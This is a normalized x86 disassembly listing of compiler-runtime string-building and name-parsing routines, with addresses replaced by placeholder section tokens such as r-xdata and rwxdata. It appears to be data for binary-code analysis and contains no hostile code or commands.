mov [ ebp - 0x8 ] al
push 0x0
push 0xa
push [ ebp + 0xc ]
dec edi
push [ ebp + 0x8 ]
call sub_40c7f0
add cl 0x30
mov [ ebp + 0x8 ] eax
or eax edx
mov [ ebp - 0x20 ] ebx
mov [ edi ] cl
mov [ ebp + 0xc ] edx
jne r-xdata
lea eax [ ebp - 0x8 ]
sub eax edi
push eax
push edi
mov ecx esi
call sub_4157cf
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn 0x8
sub_4159e9
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
xor ecx ecx
mov [ esi + 0x4 ] cl
and [ esi + 0x4 ] 0xffff00ff
push edi
lea edi [ ebp - 0x7 ]
mov [ esi ] ecx
mov [ ebp - 0x7 ] cl
mov [ ebp - 0x1d ] cl
cmp eax ecx
jg r-xdata
push ebx
jmp r-xdata
jl r-xdata
push ecx
push 0xa
push eax
push [ ebp + 0x8 ]
dec edi
call sub_40c7f0
add cl 0x30
mov [ ebp + 0x8 ] eax
mov [ edi ] cl
mov ecx [ ebp + 0x8 ]
mov eax edx
or ecx eax
mov [ ebp - 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x8 ]
neg edx
adc eax ecx
mov [ ebp - 0x1d ] 0x1
neg eax
mov [ ebp + 0x8 ] edx
cmp [ ebp + 0x8 ] ecx
jae r-xdata
xor ecx ecx
pop ebx
cmp [ ebp - 0x1d ] cl
je r-xdata
lea eax [ ebp - 0x7 ]
sub eax edi
push eax
push edi
mov ecx esi
call sub_4157cf
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
xor ecx ebp
pop esi
call sub_405894
leave
retn 0x8
dec edi
mov [ edi ] 0x2d
sub_415a84
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_41578d
mov eax esi
pop esi
pop ebp
retn 0x8
sub_415aa8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
test ecx ecx
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
movsx eax [ eax + 0x4 ]
push eax
mov ecx esi
call sub_41578d
jmp r-xdata
push ecx
mov ecx esi
call sub_415531
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
sub_415aeb
mov edi edi
push ebp
mov ebp esp
push edi
mov edi ecx
cmp [ edi + 0x4 ] 0x1
jg r-xdata
mov eax edi
pop edi
pop ebp
retn 0x4
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
cmp [ edi ] 0x0
jne r-xdata
mov al [ esi + 0x4 ]
test al al
je r-xdata
push esi
call sub_415579
jmp r-xdata
push 0x0
push 0x8
mov ecx rwxdata
call sub_414ed8
test eax eax
je r-xdata
cmp al 0x1
je r-xdata
xor eax eax
push esi
mov ecx eax
call sub_4150f5
jmp r-xdata
movsx eax al
push eax
call sub_41578d
jmp r-xdata
push eax
mov ecx edi
call sub_415531
sub_415b52
mov edi edi
push ebp
mov ebp esp
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x4 ] al
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] eax
cmp [ ebp + 0x8 ] al
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x1
lea eax [ ebp + 0x8 ]
push eax
call sub_4157cf
sub_415b7f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
push esi
mov esi ecx
mov [ esi + 0x4 ] dl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] edx
xor ecx ecx
cmp [ eax ] dl
je r-xdata
push ecx
push eax
mov ecx esi
call sub_4157cf
mov eax esi
pop esi
pop ebp
retn 0x4
inc ecx
cmp [ ecx + eax ] dl
jne r-xdata
sub_415bb4
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rwxdata ]
mov al [ eax ]
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_41548d
mov eax [ ebp + 0x8 ]
leave
retn
movsx eax al
sub eax 0x41
inc [ rwxdata ]
cmp eax 0xe
ja r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
mov edx [ ebp - 0x4 ]
and [ ebp - 0x8 ] 0x0
and edx 0xffff0002
push 0x2
pop ecx
or edx ecx
mov [ ebp - 0x4 ] edx
mov edx [ rwxdata ]
shr edx 0x1
not edx
test dl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
and eax 0xfffffffe
sub eax 0x0
je r-xdata
push 0x1
sub eax ecx
je r-xdata
push ecx
jmp r-xdata
sub eax ecx
je r-xdata
call sub_414eb9
add esp 0x4
push eax
lea ecx [ ebp - 0x8 ]
call sub_415b7f
push 0x4
jmp r-xdata
sub eax ecx
je r-xdata
push 0x3
jmp r-xdata
sub eax ecx
je r-xdata
push 0x5
jmp r-xdata
sub eax 0x4
je r-xdata
push 0x6
jmp r-xdata
sub eax ecx
jne r-xdata
push 0x7
jmp r-xdata
sub_415c7c
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
mov al [ eax ]
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_41548d
cmp al 0x41
je r-xdata
mov ecx [ ebp + 0x8 ]
inc [ rwxdata ]
push r--data
call sub_41587f
jmp r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
pop ebp
retn
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_415cc7
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_415aa8
mov eax esi
pop esi
pop ebp
retn 0x8
sub_415ceb
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_415aeb
mov eax esi
pop esi
pop ebp
retn 0x8
sub_415d0f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x1
jg r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push ebx
mov ebx [ ebp + 0x8 ]
test bl bl
je r-xdata
pop ebx
cmp [ esi ] 0x0
jne r-xdata
push 0x0
push 0x8
mov ecx rwxdata
call sub_414ed8
test eax eax
je r-xdata
push ebx
call sub_415b52
jmp r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x4 ] bl
jmp r-xdata
push eax
mov ecx esi
call sub_415531
sub_415d61
mov edi edi
push ebp
mov ebp esp
push edi
mov edi ecx
cmp [ edi + 0x4 ] 0x1
jg r-xdata
mov eax edi
pop edi
pop ebp
retn 0x4
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
je r-xdata
pop esi
pop ebx
cmp [ esi ] bl
je r-xdata
cmp [ edi ] ebx
jne r-xdata
push ebx
push 0xc
mov ecx rwxdata
call sub_414ed8
cmp eax ebx
je r-xdata
push esi
call sub_415b7f
jmp r-xdata
xor eax eax
xor edx edx
cmp [ esi ] bl
je r-xdata
push edx
push esi
mov ecx eax
call sub_415696
jmp r-xdata
inc edx
cmp [ edx + esi ] bl
jne r-xdata
push eax
mov ecx edi
call sub_415531
sub_415dc5
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] 0xffff00ff
mov [ ebp - 0x4 ] 0x1
mov [ esi ] ebx
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax esi
pop esi
pop ebx
leave
retn
push edi
pop edi
cmp al 0x5a
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
push 0x2c
mov ecx esi
call sub_415d0f
mov [ ebp - 0x4 ] ebx
jmp r-xdata
push 0x1
mov ecx esi
call sub_41578d
movsx eax al
sub eax 0x30
cmp eax 0x9
ja r-xdata
mov edi [ rwxdata ]
mov al [ edi ]
cmp al bl
je r-xdata
and [ ebp - 0x8 ] 0xffff0000
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0xc ] ebx
call sub_419f24
mov eax [ rwxdata ]
sub eax edi
pop ecx
pop ecx
cmp eax 0x1
jle r-xdata
mov ecx [ rwxdata ]
push eax
lea eax [ ebp - 0x1c ]
inc edi
push eax
mov [ rwxdata ] edi
call sub_415647
push eax
mov ecx esi
call sub_415aa8
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
call sub_415aa8
cmp [ rwxdata ] edi
jne r-xdata
mov ecx [ rwxdata ]
cmp [ ecx ] 0x9
je r-xdata
cmp [ esi + 0x4 ] bl
je r-xdata
and [ esi + 0x4 ] 0xffff00ff
mov [ esi + 0x4 ] 0x2
mov [ esi ] ebx
lea eax [ ebp - 0x14 ]
push eax
call sub_4155fd
mov eax [ rwxdata ]
mov al [ eax ]
cmp al 0x40
je r-xdata
jmp r-xdata
sub_415ecb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
push r--data
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_415d61
lea eax [ ebp - 0x8 ]
push eax
call sub_418b62
pop ecx
push eax
mov ecx esi
call sub_415aa8
push 0x7d
mov ecx esi
call sub_415d0f
mov eax [ rwxdata ]
cmp [ eax ] 0x40
jne r-xdata
mov eax esi
pop esi
leave
retn
inc [ rwxdata ]
sub_415f1f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp + 0x8 ]
leave
retn
sub_415f43
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41548d
mov ecx eax
call sub_415cc7
mov eax [ ebp + 0x8 ]
leave
retn
sub_415f67
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp + 0x8 ]
leave
retn
sub_415f8b
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_415d0f
mov eax esi
pop esi
pop ebp
retn 0x8
sub_415faf
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_415d61
mov eax esi
pop esi
pop ebp
retn 0x8
sub_415fd3
mov edi edi
push ebp
mov ebp esp
mov ecx [ rwxdata ]
sub esp 0x18
push ebx
xor ebx ebx
cmp [ ecx ] 0x51
jne r-xdata
mov al [ ecx ]
test al al
jne r-xdata
inc ecx
mov ebx r--data
mov [ rwxdata ] ecx
cmp al 0x30
jl r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_41548d
mov eax [ ebp + 0x8 ]
jmp r-xdata
push esi
push edi
xor esi esi
xor edi edi
jmp r-xdata
cmp al 0x39
jg r-xdata
pop ebx
leave
retn
cmp al 0x40
jne r-xdata
movsx eax [ ecx ]
sub eax 0x2f
cdq
inc ecx
push edx
mov [ rwxdata ] ecx
push eax
test ebx ebx
je r-xdata
test al al
je r-xdata
mov al [ ecx ]
inc ecx
mov [ rwxdata ] ecx
cmp al 0x40
je r-xdata
lea ecx [ ebp - 0x18 ]
call sub_41597b
lea ecx [ ebp - 0x8 ]
call sub_41597b
push eax
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_415f67
add esp 0xc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_41548d
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp al 0x41
jl r-xdata
cmp [ ebp + 0xc ] 0x0
push edi
push esi
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
jmp r-xdata
pop edi
pop esi
cmp al 0x50
jg r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
movsx eax al
shld edi esi 0x4
sub eax 0x41
cdq
shl esi 0x4
add eax esi
adc edi edx
inc ecx
mov esi eax
mov [ rwxdata ] ecx
mov al [ ecx ]
lea ecx [ ebp - 0x8 ]
call sub_41597b
lea ecx [ ebp - 0x18 ]
call sub_41597b
lea ecx [ ebp - 0x8 ]
call sub_4159e9
jmp r-xdata
lea ecx [ ebp - 0x18 ]
call sub_4159e9
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
push eax
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_415f67
add esp 0xc
jmp r-xdata
sub_416119
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rwxdata ]
mov al [ eax ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0xffff0000
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_41548d
mov eax [ ebp + 0x8 ]
leave
retn
movsx eax al
add eax 0xffffffd0
cmp eax 0x7
ja r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
jmp [ eax * 4 + jump_table_4161e5 ]
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
mov eax [ rwxdata ]
movsx eax [ eax ]
inc [ rwxdata ]
sub eax 0x31
je r-xdata
lea ecx [ ebp - 0x8 ]
call sub_415b7f
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x18 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
jmp r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
leave
retn
dec eax
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
sub_416205
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
movsx eax [ eax ]
sub esp 0x10
sub eax 0x58
je r-xdata
inc [ rwxdata ]
push r--data
dec eax
dec eax
je r-xdata
mov eax [ rwxdata ]
inc [ rwxdata ]
shr eax 0x12
not eax
test al 0x1
mov eax r--data
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_415dc5
pop ecx
mov ecx [ ebp - 0x4 ]
test cl cl
jne r-xdata
push eax
jmp r-xdata
mov eax r--data
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
leave
retn
mov eax [ rwxdata ]
mov al [ eax ]
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_41587f
mov eax [ ebp + 0x8 ]
leave
retn
cmp al 0x40
je r-xdata
inc [ rwxdata ]
cmp al 0x5a
je r-xdata
mov eax [ rwxdata ]
inc [ rwxdata ]
shr eax 0x12
not eax
test al 0x1
mov eax r--data
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
push eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_415faf
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
leave
retn
mov eax r--data
sub_4162e5
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
mov al [ eax ]
sub esp 0x18
test al al
je r-xdata
push 0x29
push [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push 0x1
push eax
push r--data
lea ecx [ ebp - 0x10 ]
call sub_41587f
mov ecx eax
call sub_415a84
mov ecx eax
cmp al 0x5a
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_416205
pop ecx
push eax
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea ecx [ ebp - 0x18 ]
call sub_41587f
mov ecx eax
call sub_415cc7
push 0x29
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
jmp r-xdata
inc [ rwxdata ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
and edx 0xffff0000
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
leave
retn
call sub_415f8b
mov eax [ ebp + 0x8 ]
leave
retn
sub_41636f
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
and [ ebp - 0x8 ] 0xffff0000
push ebx
xor ebx ebx
xor ecx ecx
inc [ rwxdata ]
mov eax [ rwxdata ]
mov dl [ eax ]
movsx eax dl
push esi
mov esi eax
sub esi 0x41
push edi
mov edi 0xffff00ff
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec esi
je r-xdata
mov eax [ ebp + 0x8 ]
inc [ rwxdata ]
mov [ eax + 0x4 ] bl
and [ eax + 0x4 ] edi
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
cmp [ eax ] 0x26
mov eax r--data
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec esi
je r-xdata
mov [ ecx ] eax
mov eax r--data
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
mov [ eax + 0x4 ] 0x2
jmp r-xdata
mov eax [ ebp + 0x10 ]
and [ ebp - 0x8 ] 0xffffff00
and [ ebp - 0x8 ] edi
mov [ eax ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] 0x3e
mov [ ebp - 0xc ] ebx
call sub_4157cf
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] r--data
jmp r-xdata
cmp dl bl
je r-xdata
mov [ eax ] ebx
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_41548d
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov edx [ rwxdata ]
mov dl [ edx + 0x1 ]
cmp dl bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x14 ] ebx
je r-xdata
add [ rwxdata ] 0x2
add eax 0xffffffd0
movsx edx dl
add eax eax
lea esi [ edx + eax * 8 - 0x30 ]
cmp esi 0x1
jbe r-xdata
mov eax [ ebp - 0x8 ]
and [ ebp - 0x8 ] 0xffffff00
and [ ebp - 0x8 ] 0xffff00ff
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] 0x2c
mov [ ebp - 0xc ] ebx
call sub_4157cf
push ebx
push esi
lea ecx [ ebp - 0x1c ]
call sub_41597b
push eax
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_415cc7
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
jmp r-xdata
mov [ ebp - 0x10 ] ecx
push 0x5e
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
call sub_415d0f
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
inc [ rwxdata ]
jmp r-xdata
mov [ ebp - 0x14 ] ecx
push 0x3e
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
call sub_415d0f
mov edx [ rwxdata ]
cmp [ edx ] 0x24
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jne r-xdata
push 0x1
lea ecx [ ebp - 0xc ]
call sub_41578d
inc [ rwxdata ]
jmp r-xdata
mov eax [ rwxdata ]
cmp [ eax ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
or ecx 0x4000
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub_416537
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
sub esp 0x38
push ebx
xor ebx ebx
cmp [ eax ] bl
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] ebx
je r-xdata
call sub_41489f
mov [ ebp - 0x4 ] eax
cmp eax ebx
jge r-xdata
lea eax [ ebp - 0x38 ]
push 0x5d
push eax
lea eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push 0x28
lea ecx [ ebp - 0x38 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x24 ]
push r--data
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
call sub_415d61
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
push 0x1
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
call sub_41578d
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push 0x5d
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_415d0f
lea eax [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
push eax
push [ ebp + 0x8 ]
call sub_419b61
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
and [ ebp - 0xc ] 0xffff0000
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi 0x800
mov [ ebp - 0x10 ] ebx
test [ edi + 0x4 ] esi
je r-xdata
lea eax [ ebp - 0x28 ]
push 0x5d
push eax
lea eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
push r--data
lea ecx [ ebp - 0x10 ]
call sub_415d61
jmp r-xdata
push 0x1
push eax
push 0x5b
call sub_415852
mov ecx eax
call sub_415a84
mov ecx eax
call sub_415f8b
mov eax [ ebp - 0x4 ]
dec [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ edi ] ebx
je r-xdata
mov eax [ rwxdata ]
cmp [ eax ] bl
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_419f24
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x28 ]
pop ecx
pop ecx
mov ecx [ ebp - 0x24 ]
or ecx esi
pop edi
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
jmp r-xdata
test [ edi + 0x4 ] esi
je r-xdata
lea eax [ ebp - 0x30 ]
push ebx
push eax
call sub_415fd3
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x5b
lea ecx [ ebp - 0x38 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
push 0x5d
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
call sub_415d0f
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_415aa8
pop ebx
leave
retn
push edi
lea eax [ ebp - 0x20 ]
push eax
push 0x28
lea ecx [ ebp - 0x38 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
push 0x29
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_415d0f
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x18 ]
call sub_415aa8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov ecx edi
call sub_415cc7
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
mov [ ebp - 0xc ] eax
sub_41672d
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_415fd3
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x60
lea ecx [ ebp - 0x18 ]
call sub_415852
mov ecx eax
call sub_415cc7
push 0x27
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
call sub_415f8b
mov eax [ ebp + 0x8 ]
leave
retn
sub_4167ac
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
inc ebx
mov [ esi + 0x4 ] eax
cmp al bl
jg r-xdata
mov eax esi
pop esi
pop ebx
leave
retn
mov ecx [ rwxdata ]
cmp [ ecx ] 0x0
je r-xdata
cmp al bl
jg r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_415379
mov eax [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push 0x20
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_415d0f
push esi
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_415cc7
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
cmp al bl
jg r-xdata
push esi
lea eax [ ebp - 0x10 ]
push eax
push ebx
lea ecx [ ebp - 0x20 ]
call sub_41548d
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x10 ]
mov [ esi ] eax
mov eax [ ebp - 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ rwxdata ]
cmp [ eax ] 0x40
je r-xdata
inc [ rwxdata ]
jmp r-xdata
push r--data
jmp r-xdata
mov ecx esi
call sub_415d61
mov eax [ rwxdata ]
mov al [ eax ]
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jg r-xdata
cmp al 0x40
je r-xdata
mov eax [ rwxdata ]
cmp [ eax ] 0x40
jne r-xdata
mov eax [ rwxdata ]
cmp [ eax ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_418b62
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x60
lea ecx [ ebp - 0x20 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push 0x27
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_415d0f
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
call sub_415aa8
mov eax [ rwxdata ]
cmp [ eax ] 0x40
jne r-xdata
push 0x7d
mov ecx esi
call sub_415d0f
push ebx
mov ecx esi
call sub_41578d
cmp [ esi + 0x4 ] bl
jg r-xdata
inc eax
mov [ rwxdata ] eax
cmp [ eax ] 0x40
je r-xdata
cmp [ esi + 0x4 ] bl
jle r-xdata
push r--data
sub_41690b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x8 ]
call sub_41587f
mov eax [ rwxdata ]
mov al [ eax ]
inc [ rwxdata ]
cmp al 0x40
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
mov eax [ rwxdata ]
mov al [ eax ]
